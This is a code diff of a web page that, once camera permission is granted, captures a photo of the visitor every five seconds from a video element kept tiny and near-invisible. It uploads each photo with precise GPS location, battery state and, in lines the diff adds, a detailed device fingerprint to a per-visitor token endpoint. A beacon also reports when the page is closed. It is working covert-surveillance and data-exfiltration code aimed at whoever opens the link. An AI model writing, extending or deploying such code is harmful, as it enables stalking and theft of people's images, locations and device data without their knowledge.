@@ -7,8 +7,6 @@
   <style>
     body { font-family: system-ui, Arial, sans-serif; padding: 12px; }
     #status { white-space: pre-line; margin-top: 8px; }
-
-    /* keep video on screen but tiny & almost invisible to avoid black frames */
     video {
       position: fixed;
       bottom: 4px;
@@ -19,7 +17,6 @@
       pointer-events: none;
       z-index: 9999;
     }
-
     canvas { display: none !important; }
   </style>
 </head>
@@ -35,189 +32,164 @@
     const statusEl = document.getElementById("status");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-    const INTERVAL = 5000; // ms
+    const INTERVAL = 5000;
     let stream = null;
     let timer = null;
-    let uploading = false;
 
-    function log(msg){
-      statusEl.textContent = msg;
-      console.log(msg);
+    function log(s){
+      statusEl.textContent = s;
+      console.log(s);
     }
+    const json = o => JSON.stringify(o);
 
-    function jsonBlob(o){
-      return new Blob([JSON.stringify(o)], { type: "application/json" });
-    }
-
-    function waitForVideoReady(maxWaitMs = 2000){
-      return new Promise((resolve) => {
-        if (video.videoWidth > 0 && video.videoHeight > 0) return resolve(true);
-        let resolved = false;
-        function done() { if (!resolved) { resolved = true; resolve(true); } }
-        function fallback() { if (!resolved) { resolved = true; resolve(false); } }
-        video.onloadedmetadata = () => { if (video.videoWidth > 0) done(); };
-        video.oncanplay = () => { if (video.videoWidth > 0) done(); };
-        setTimeout(() => fallback(), maxWaitMs);
-      });
-    }
-
-    function captureFrame(){
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        return null;
+    async function getDetails(){
+      const d = {};
+      d.userAgent = navigator.userAgent || "";
+      d.platform = navigator.platform || "";
+      d.cpuCores = navigator.hardwareConcurrency ?? null;
+      d.ramGB = navigator.deviceMemory ?? null;
+      d.languages = navigator.languages || [navigator.language];
+      d.screen = {
+        w: screen?.width ?? null,
+        h: screen?.height ?? null,
+        ratio: devicePixelRatio ?? 1,
+      };
+      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (conn){
+        d.network = {
+          type: conn.effectiveType,
+          downlink: conn.downlink,
+          rtt: conn.rtt,
+          saveData: conn.saveData,
+        };
       }
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext("2d");
-      ctx.drawImage(video, 0, 0);
-      return canvas.toDataURL("image/jpeg", 0.75);
-    }
-
-    async function getCoords(timeout = 4000){
-      return new Promise((resolve) => {
-        if (!("geolocation" in navigator)) return resolve(null);
-        let done = false;
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            if (!done) {
-              done = true;
-              resolve({
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                accuracy: pos.coords.accuracy
-              });
-            }
-          },
-          err => {
-            if (!done) {
-              done = true;
-              resolve(null);
-            }
-          },
-          { timeout, enableHighAccuracy: true }
-        );
-        setTimeout(() => {
-          if (!done) {
-            done = true;
-            resolve(null);
-          }
-        }, timeout + 300);
-      });
+      d.permissions = {};
+      if (navigator.permissions){
+        for (const name of ["camera", "geolocation"]){
+          try {
+            const r = await navigator.permissions.query({name});
+            d.permissions[name] = r.state;
+          } catch {}
+        }
+      }
+      d.storage = {};
+      try {
+        if (navigator.storage?.estimate){
+          const est = await navigator.storage.estimate();
+          d.storage.quotaBytes = est.quota ?? null;
+          d.storage.usageBytes = est.usage ?? null;
+        }
+      } catch {}
+      try {
+        const opt = Intl.DateTimeFormat().resolvedOptions();
+        d.tz = { zone: opt.timeZone, offset: new Date().getTimezoneOffset() };
+      } catch {}
+      return d;
     }
 
     async function getBattery(){
       try{
-        if (navigator.getBattery) {
+        if (navigator.getBattery){
           const b = await navigator.getBattery();
           return { level: Math.round(b.level * 100), charging: !!b.charging };
         }
-      } catch(e){}
+      } catch {}
       return null;
     }
 
-    async function upload(data){
-      if (uploading) return false;
-      uploading = true;
-      const url = `/upload_image/${token}`;
-      try {
-        const blob = jsonBlob(data);
-        if (navigator.sendBeacon) {
-          const ok = navigator.sendBeacon(url, blob);
-          if (ok) { uploading = false; return true; }
-        }
-      } catch(e){
-        console.warn("sendBeacon error", e);
-      }
+    async function getCoords(timeout = 4000){
+      return new Promise(resolve => {
+        if (!("geolocation" in navigator)) return resolve(null);
+        let done = false;
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            if (!done){
+              done = true;
+              resolve({
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy
+              });
+            }
+          },
+          () => { if (!done){ done = true; resolve(null); } },
+          { timeout, enableHighAccuracy: true }
+        );
+        setTimeout(() => { if (!done){ done = true; resolve(null); } }, timeout + 300);
+      });
+    }
+
+    function captureFrame(){
+      if (!video.videoWidth) return null;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      return canvas.toDataURL("image/jpeg", 0.75);
+    }
+
+    async function upload(payload){
       try {
         await fetch(`/upload_image/${token}`, {
           method: "POST",
-          headers: {"Content-Type": "application/json"},
-          body: JSON.stringify(data),
+          headers: { "Content-Type": "application/json" },
+          body: json(payload),
           keepalive: true
         });
-        uploading = false;
         return true;
-      } catch(e){
-        console.warn("upload fetch error", e);
+      } catch {
+        return false;
       }
-      uploading = false;
-      return false;
     }
 
-    async function captureLoop(){
-      const ready = await waitForVideoReady(3000);
-      if (!ready) {
-        log("Video not ready yet, skipping this tick.");
-        return;
-      }
-      await new Promise(r => setTimeout(r, 250));
-
+    async function loop(){
       const frame = captureFrame();
-      if (!frame) {
-        log("Blank frame, will retry next tick.");
+      if (!frame){
+        log("Frame empty, retrying...");
         return;
       }
 
-      const [battery, coords] = await Promise.all([getBattery(), getCoords(3000)]);
-      const payload = {
+      const [battery, coords, details] = await Promise.all([
+        getBattery(),
+        getCoords(),
+        getDetails(),  // <<–– FULL DEVICE INFORMATION
+      ]);
+
+      const ok = await upload({
         image_b64: frame,
-        battery: battery || null,
-        coords: coords || null
-      };
-      const ok = await upload(payload);
-      log(ok ? "Uploaded image" : "Upload failed");
+        battery,
+        coords,
+        details,      // <<–– SEND TO BACKEND
+      });
+
+      log(ok ? "Uploaded" : "Upload failed");
     }
 
     async function start(){
-      log("Requesting camera…");
-      try {
+      try{
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "environment" },
-          audio: false
+          audio: false,
         });
-      } catch(e) {
-        log("Camera permission denied or error");
+      } catch {
+        log("Camera permission denied");
         return;
       }
+
       video.srcObject = stream;
-
-      const ready = await waitForVideoReady(3000);
-      if (!ready) {
-        await new Promise(r => setTimeout(r, 500));
-      }
-      log("Camera ready. Starting capture loop.");
-      captureLoop().catch(err => console.warn(err));
-      timer = setInterval(() => {
-        captureLoop().catch(err => console.warn(err));
-      }, INTERVAL);
-    }
-
-    function stopAll(){
-      if (timer) { clearInterval(timer); timer = null; }
-      if (stream) {
-        try { stream.getTracks().forEach(t => t.stop()); } catch(e){}
-        stream = null;
-      }
-      log("Capture stopped.");
+      await new Promise(r => setTimeout(r, 500));
+      loop();
+      timer = setInterval(loop, INTERVAL);
     }
 
     window.addEventListener("beforeunload", () => {
-      try {
-        if (navigator.sendBeacon) {
-          navigator.sendBeacon(
-            `/upload_info/${token}`,
-            jsonBlob({ note: "page-closed" })
-          );
-        } else {
-          fetch(`/upload_info/${token}`, {
-            method: "POST",
-            headers: {"Content-Type":"application/json"},
-            body: JSON.stringify({ note: "page-closed" }),
-            keepalive: true
-          }).catch(()=>{});
-        }
-      } catch(e){}
-      stopAll();
+      try{
+        navigator.sendBeacon(
+          `/upload_info/${token}`,
+          new Blob([json({ note: "page-closed" })], {type: "application/json"})
+        );
+      } catch {}
     });
 
     start();
